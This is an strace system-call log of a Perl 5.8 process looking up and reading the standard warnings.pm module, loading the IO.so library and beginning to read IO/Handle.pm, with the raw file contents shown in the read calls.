10004 07:30:53.684604 stat64("/etc/perl/warnings.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684617 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684630 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684644 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684656 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684688 stat64("/usr/lib/perl5/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684742 stat64("/usr/lib/perl5/warnings.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684808 stat64("/usr/share/perl5/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684821 stat64("/usr/share/perl5/warnings.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684834 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684846 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684860 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684872 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
10004 07:30:53.684893 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.684907 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.684918 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.684937 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
10004 07:30:53.685369 brk(0x81b6000)    = 0x81b6000
10004 07:30:53.685386 brk(0x81b5000)    = 0x81b5000
10004 07:30:53.685463 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
10004 07:30:53.685932 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
10004 07:30:53.686636 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
10004 07:30:53.686848 read(8, "", 4096) = 0
10004 07:30:53.686862 close(8)          = 0
10004 07:30:53.687011 _llseek(6, 412, [412], SEEK_SET) = 0
10004 07:30:53.687026 _llseek(6, 0, [412], SEEK_CUR) = 0
10004 07:30:53.687037 close(6)          = 0
10004 07:30:53.687077 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10004 07:30:53.687100 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10004 07:30:53.687128 futex(0xb7ee2070, 0x81 /* FUTEX_??? */, 2147483647) = 0
10004 07:30:53.687143 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
10004 07:30:53.687157 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10004 07:30:53.687304 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10004 07:30:53.687330 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7ee6000
10004 07:30:53.687343 mmap2(0xb7eea000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7eea000
10004 07:30:53.687358 close(6)          = 0
10004 07:30:53.687485 stat64("/etc/perl/IO/Handle.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687501 stat64("/etc/perl/IO/Handle.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687515 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687528 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687541 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687554 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687568 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687580 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687593 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687605 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687618 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.687630 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
10004 07:30:53.687651 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.687679 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.687724 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.687758 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    